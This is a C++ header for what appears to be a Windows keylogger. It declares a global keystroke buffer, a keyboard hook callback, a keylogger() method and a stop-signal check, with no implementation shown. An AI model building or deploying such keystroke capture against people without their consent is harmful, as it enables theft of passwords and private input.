#pragma once
#include "DataObj/DataObj.h"
#include <memory>
#include <conio.h>
#include <windows.h>
#include <vector>

std::vector<int> keylog;

class KLG_Func
{
public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	std::shared_ptr<DataObj> keylogger();

	bool checkStopSignal();

};